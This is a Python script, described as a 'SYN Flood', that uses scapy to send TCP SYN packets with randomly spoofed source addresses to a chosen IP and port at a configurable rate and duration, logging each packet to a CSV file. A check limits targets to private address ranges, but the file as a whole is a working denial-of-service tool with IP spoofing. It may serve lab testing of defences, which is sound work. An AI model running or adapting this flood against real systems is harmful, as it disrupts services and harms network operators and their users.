#!/usr/bin/env python3
import argparse
import time
import random
import os
import sys

def is_private_ip(ip):
    try:
        parts = list(map(int, ip.split(".")))
        if parts[0] == 127:
            return True
        if parts[0] == 10:
            return True
        if parts[0] == 172 and 16 <= parts[1] <= 31:
            return True
        if parts[0] == 192 and parts[1] == 168:
            return True
    except:
        pass
    return False

def random_private_source_ip(target_ip):
    parts = list(map(int, target_ip.split(".")))
    if parts[0] == 127:
        return f"127.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(2,254)}"
    if parts[0] == 10:
        return f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    if parts[0] == 172:
        return f"172.{random.randint(16,31)}.{random.randint(0,255)}.{random.randint(1,254)}"
    return f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"

def main():
    parser = argparse.ArgumentParser(description="SYN Flood")
    parser.add_argument("--target-ip", required=True)
    parser.add_argument("--target-port", type=int, required=True)
    parser.add_argument("--duration", type=int, required=True)
    parser.add_argument("--rate", type=int, required=True)
    parser.add_argument("--output", required=True)
    args = parser.parse_args()

    if not is_private_ip(args.target_ip):
        print(f"[ERROR] Target {args.target_ip} is not in the legal internal network. Access denied. ")
        exit(1)

    log_dir = os.path.dirname(args.output)
    if log_dir:
        os.makedirs(log_dir, exist_ok=True)

    try:
        from scapy.all import IP, TCP, send
    except ImportError:
        print("[ERROR] Missing dependency: scapy. Install it with: python3 -m pip install scapy", file=sys.stderr)
        return 1

    start_time = time.time()
    with open(args.output, "w") as f:
        f.write("timestamp,src_ip,dst_ip,dst_port,action\n")

    while time.time() - start_time < args.duration:
        try:
            src_ip = random_private_source_ip(args.target_ip)
            ip = IP(src=src_ip, dst=args.target_ip)
            tcp = TCP(sport=random.randint(1024,65535), dport=args.target_port, flags="S")
            send(ip/tcp, verbose=0)

            ts = time.strftime("%Y-%m-%dT%H:%M:%S")
            with open(args.output, "a") as f:
                f.write(f"{ts},{src_ip},{args.target_ip},{args.target_port},sent_syn\n")

            time.sleep(1.0 / args.rate)
        except Exception as e:
            with open(args.output, "a") as f:
                f.write(f"{time.strftime('%Y-%m-%dT%H:%M:%S')},ERROR,ERROR,ERROR,{str(e)}\n")
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
